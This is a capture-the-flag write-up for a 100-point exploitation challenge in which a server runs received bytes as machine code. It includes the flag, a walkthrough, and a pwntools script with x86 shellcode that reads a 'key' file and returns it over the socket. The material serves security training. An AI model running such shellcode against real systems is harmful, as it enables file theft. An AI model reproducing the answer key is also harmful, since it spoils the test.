# Challenge Name
Sp3ak the Lingo

# Point Value and Assessed Difficulty
100

# Category
Network Exploitation

# Challenge Prompt/Question
This is as easy as you can ask for, we're just going to execute what you send, but you gotta talk the talk.  The flag is in the same directory in a file named "key" (no quotes).

* [binary](link to binary)

# Hints

* __Hint 1:__ *(file descriptor order)* File descriptors are generally opened in numerical order, and there are generally two socket file descriptors on the server side: one for socket() and one for accept().

# Key
Assembly_is_the_language_of_this_land


# Walkthrough
This challenge runs whatever code it receives on the listening port, and the key is in a file named "key" in the same directory.

If you had to RE the binary to figure out all of that, you could drop it into objdump or IDA, and you'd notice right away it has friendly symbols.  The bindfork() function does what it says, so to find the port to connect to, look for the call to bind() and work back.  You'll often see a call to htons() to convert the port from host order to network order, and that's the case here. Looking at the arguments to htons(), you can see it's the port is passed in as a parameter to the bindfork function.  Going back to the call to bindfork() in main, you can see the value 0xb0f (2831 decimal) being passed in, and that's the port the server listens on.

After that, we can look for calls to send() and recv() (in this case the recv() is implemented as a call to read()) to see what the program tells us or does with our input.  Following what is done with the buffer into which the program reads our input, you'll see a "call eax" instruction, where eax is set to the address of the buffer.  This means we send data to the program and it will be executed by the program as machine code, so we just need to write code to read the key file and send it back to us. 

You can either handcode assembly to do this or use utilities to help with this, but the basic idea is use linux system calls to open the file, read it, and send it back over the socket.  I'm not going to cover all the concepts needed, but go through the mechanics so you can research concepts as needed.

The standard CTF way is to take existing shellcode and modify it to do what you want.  Take the shellcode at http://wiremask.eu/shellcode-file-reader-linux-x86/ for example.  All you need to do is realize that you want to read "key" instead of "/etc/passwd" and write to a different file descriptor.[1](#endnote1)

The file descriptor you want to write to is 4, and we get to that conclusion because the first three file descriptors are STDIN, STDOUT, and STDERR respectively, followed by the socket() and accept() file desciptors since the target program doesn't open any other file descriptors before our socket.  If you didn't know or couldn't count on it being a specific file descriptor, you could always write a loop that writes the file contents to every fd greater than 3.

The top google hits for associated search terms go over the mechanics for assembling shellcode; I followed the steps outlined at http://www.vividmachines.com/shellcode/shellcode.html and it worked on the shellcode I adapted, but it wasn't as easy as the other way I solved this problem.

I wrote a solution using pwntools, their pwnlib.shellcraft.i386.linux.readfile is basically a one-line answer to generating assembly that will do what you want.  You should check out their work regardless; they've done a great job of making it so you can go to their source and see what they've done.[2](#endnote2)


## Concept Development
This is essentially an assembly programming challenge, under the constraints of your code being inside another program.  This is the basis for all challenges like this, and so this challenge shows that the competitor understands key fundamentals.

## Solution
----

# Proof of Exploit/Solution

```python
from pwn import *
import pwnlib.shellcraft.i386 as shellcraft
from socket import *
from sys import stdout

# assembled from file_reader.asm
assembled_shellcode = "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6b\x65\x79\x00\x89\xe3\xcd\x80\x93\x91\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x92\xb3\x04\xc1\xe8\x0a\xcd\x80\x93\xcd\x80"

def get_shellcode():
	sock_fd = 4 # starting at 0: stdin, stdout, stderr, socket
	# copying in pwnlib.shellcraft.i386.linux.readfile because my local version didn't have it
	# https://github.com/Gallopsled/pwntools/blob/60307ed1c7/pwnlib/shellcraft/templates/i386/linux/readfile.asm
	# otherwise this next bit would just be:
	# sc_str = shellcraft.linux.readfile("key", sock_fd)
	# yes, really.  just one line.
	sc_str = ('' 
	    + shellcraft.mov('edi', sock_fd)  # save the fd to write to in a non-volatile reg
	    + shellcraft.pushstr("key") # write the filename to the stack
	    + shellcraft.syscall('SYS_open', 'esp', 'O_RDONLY') # open the file path we just wrote
	    + shellcraft.mov('ebp', 'eax') # save the fd in a non-volatile reg
	    + shellcraft.syscall('SYS_fstat', 'eax', 'esp') # stat the file to get filesize
	    + '''/* Get file size */
	      add esp, 20
	      mov esi, [esp]\n''' # ugh, forced assembly. pulls size out of the fstat struct 
	    + shellcraft.syscall('SYS_sendfile', 'edi', 'ebp', 0, 'esi') # write the file to sock
        + shellcraft.syscall('SYS_exit', 0) # exit cleanly
	)
	sc = asm(sc_str)
	#sc = assembled_shellcode
	return sc

def main(ip, port):
    s = socket()
    s.connect((ip, port))
    sc = get_shellcode()
    #sc = assembled_shellcode
    s.send(sc)
    while True:
        c = s.recv(1)
        stdout.write(c)
        if c == "\n" or c == '\x00':
            break

if __name__ == "__main__":
    host = "localhost"
    port = 0xb0f
    main(host, port)
```

```asm
; file_reader.asm, modified from http://wiremask.eu/shellcode-file-reader-linux-x86/
global _start
 
section .text
 
_start:
  xor ecx, ecx
  mul ecx
 
open:
  mov al, 0x05
  push ecx
  push 0x0079656b
  mov ebx, esp
  int 0x80
 
read:
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x03
  mov dx, 0x0FFF
  inc edx
  int 0x80
 
write:
  xchg eax, edx
  mov bl, 0x04
  shr eax, 0x0A
  int 0x80
 
exit:
  xchg eax, ebx
  int 0x80
```

----

# Endnotes

<a name="endnote1">[1]</a>: Shellcode used in my reference [here](http://wiremask.eu/shellcode-file-reader-linux-x86/)

<a name="endnote2">[2]</a>: Pwnlib file reader python for generating shellcode [link](https://github.com/Gallopsled/pwntools/blob/60307ed1c7/pwnlib/shellcraft/templates/i386/linux/readfile.asm)

